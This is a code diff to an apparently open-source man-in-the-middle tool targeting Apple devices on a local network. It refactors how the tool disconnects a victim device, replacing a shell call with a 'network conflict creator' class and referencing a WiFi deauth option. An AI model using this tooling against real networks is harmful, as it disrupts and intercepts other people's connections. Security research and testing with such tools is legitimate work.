@@ -3,7 +3,7 @@
 
 # region Description
 """
-apple_dhcp_mitm.py: MiTM Apple devices in local network
+apple_mitm.py: MiTM Apple devices (apple_mitm)
 Author: Vladimir Ivanov
 License: MIT
 Copyright 2020, Raw-packet Project
@@ -11,6 +11,7 @@ Copyright 2020, Raw-packet Project
 # endregion
 
 # region Import
+from raw_packet.Scripts.Others.ncc import NetworkConflictCreator
 from sys import path as sys_path
 from os.path import dirname, abspath
 from prettytable import PrettyTable
@@ -21,7 +22,6 @@ from argparse import ArgumentParser, RawTextHelpFormatter
 from sys import exit, stdout
 from time import sleep
 from ipaddress import IPv4Address
-from socket import socket, AF_PACKET, SOCK_RAW
 from random import randint
 from typing import Union, List, Dict
 import re
@@ -45,7 +45,7 @@ aireply_stop: bool = False
 
 # region Disconnect device
 def disconnect_device(network_interface: str = 'eth0',
-                      ip_address: str = '129.168.0.1',
+                      ip_address: str = '192.168.0.1',
                       mac_address: str = '12:34:56:78:90:ab',
                       use_deauth_technique: bool = False,
                       deauth_interface: Union[None, str] = None,
@@ -54,10 +54,11 @@ def disconnect_device(network_interface: str = 'eth0',
                       network_bssid: Union[None, str] = None):
 
     if not use_deauth_technique:
-        # Start Network conflict creator script
-        sub.Popen(['python3 ' + project_root_path + '/Scripts/Others/network_conflict_creator.py' +
-                   ' --interface ' + network_interface + ' --target_ip ' + ip_address +
-                   ' --target_mac ' + mac_address + ' --quiet'], shell=True)
+        # Start Network Conflict Creator (ncc)
+        ncc: NetworkConflictCreator = NetworkConflictCreator(network_interface=network_interface)
+        ncc.start(target_mac_address=mac_address,
+                  target_ip_address=ip_address,
+                  exit_on_success=True)
 
     else:
         # Start WiFi deauth packets sender
